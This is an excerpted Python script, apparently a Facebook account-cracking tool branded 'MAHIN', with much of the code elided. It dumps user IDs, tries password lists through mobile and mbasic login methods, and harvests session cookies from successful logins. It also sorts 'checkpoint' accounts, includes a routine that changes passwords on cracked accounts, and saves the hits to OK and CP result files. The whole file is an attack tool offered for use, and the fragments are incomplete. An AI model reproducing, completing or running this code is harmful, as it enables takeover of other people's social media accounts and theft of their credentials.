...
_my_account_ = [
    '100000545457649','100079172828815']
...
def dump_name(_azimvau_):
    print('%s [%s•%s] %sEXAMPLE : MAHIN, Karma'%(H,P,H,K));__name__ = _cici_azimvau_('%s [%s•%s] %sENTER NAME : '%(H,P,H,K)).split(',');_file_ = 'dump_name.json'
    try:os.remove(_file_)
    except:pass
...
def cek_opsi(user,pw,format):
    ...
    if "c_user" in _req_ses_.cookies.get_dict():
        ...
        else:_cookies_ = ''.join(_req_ses_.cookies.get_dict());_result_ok_ = "\r %s[%sMAHIN-OK%s] %s • %s%s%s          "%(H,P,H,user,pw,tahun(user),P);cek_apk(_result_ok_,cvt_cookies(_cookies_))
...
def change_pass(user,_req_ses_,_response_,link_2):
    ...
    _password_ = ''.join(_new_pass_);_result_ok_ = "\r %s[%sMAHIN-OK%s] %s • %s%s%s          "%(H,P,H,user,_password_,tahun(user),P);_button_dev_ = ["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for _azimvau_ in _response_("input"):
...
class crack:
    ...
    def start_crack(self,fl):
        try:
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_ok:pass
                        ...
                        if 'methode_mbasic_v1' in metode or 'methode_mbasic_v2' in metode or 'methode_mobile_v1' in metode or 'methode_mobile_v2' in metode:h_ok = "\r %s[%sMAHIN-OK%s] %s • %s%s%s          "%(H,P,H,fl.get("id"),i,tahun(fl.get("id")),P);cek_apk(h_ok,cvt_cookies(log.get("cookies")))
            ...
            self.ko+=1
            print("\r %s[%sCRACK%s][%s%s/%s%s][%sMAHIN-OK:%s%s][%sMelanin-CP:%s%s]%s"%(K,H,K,P,self.ko,len(self.fl),K,P,len(self.ada),K,P,len(self.cp),K,P), end='');sys.stdout.flush()
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            ...
            try:
                ...
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sMAHIN-OK%s] %s'%(H,P,H,yyy))
        ...
        try:
            cpl = os.listdir("MAHIN-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("MAHIN-CP/%s"%(files)).read().splitlines()
                for x in ppp:yyy = x.replace('•',' • ');print(' %s[%sMAHIN-CP%s] %s'%(K,P,K,yyy))
...
def cek_result():
    ...
    for memek in buka_baju:
        ...
        _format_ = "\r %s[%sMAHIN-CP%s] %s          "%(K,P,K,kontol)
...
def started():
    ...
    print('%s [%s•%s] %s[%sMAHIN-OK%s] IDS SAVED IN >> %sMelanin-OK/%s.txt'%(H,B,H,O,H,O,H,tanggal))
    print('%s [%s•%s] %s[%sMAHIN-CP%s] IDS SAVED IN >> %sMelanin-CP/%s.txt'%(H,K,H,O,M,O,M,tanggal))
